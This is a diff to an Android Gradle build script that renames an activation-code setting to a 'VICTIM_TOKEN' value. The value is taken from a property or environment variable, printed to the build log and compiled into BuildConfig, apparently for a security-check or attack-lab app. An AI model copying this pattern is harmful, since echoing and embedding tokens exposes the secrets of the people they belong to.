@@ -2,15 +2,16 @@ plugins {
     id 'com.android.application'
 }
 
-def activationCodeValue = "DEFAULT"
-if (project.hasProperty('activationCode')) {
-    activationCodeValue = project.property('activationCode')
+// ★ VICTIM_TOKEN
+def victimTokenValue = "DEFAULT_TOKEN"
+if (project.hasProperty('victimToken')) {
+    victimTokenValue = project.property('victimToken')
 }
-if (System.getenv("ACTIVATION_CODE")) {
-    activationCodeValue = System.getenv("ACTIVATION_CODE")
+if (System.getenv("VICTIM_TOKEN")) {
+    victimTokenValue = System.getenv("VICTIM_TOKEN")
 }
 
-println "BUILDING WITH ACTIVATION_CODE = ${activationCodeValue}"
+println "BUILDING WITH VICTIM_TOKEN = ${victimTokenValue}"
 
 android {
     namespace 'com.sec.check'
@@ -22,7 +23,7 @@ android {
         targetSdk 33
         versionCode 1
         versionName "1.0"
-        buildConfigField "String", "ACTIVATION_CODE", "\"${activationCodeValue}\""
+        buildConfigField "String", "VICTIM_TOKEN", "\"${victimTokenValue}\""
     }
 
     buildFeatures {
@@ -32,10 +33,10 @@ android {
     buildTypes {
         release {
             minifyEnabled false
-            buildConfigField "String", "ACTIVATION_CODE", "\"${activationCodeValue}\""
+            buildConfigField "String", "VICTIM_TOKEN", "\"${victimTokenValue}\""
         }
         debug {
-            buildConfigField "String", "ACTIVATION_CODE", "\"${activationCodeValue}\""
+            buildConfigField "String", "VICTIM_TOKEN", "\"${victimTokenValue}\""
         }
     }
 
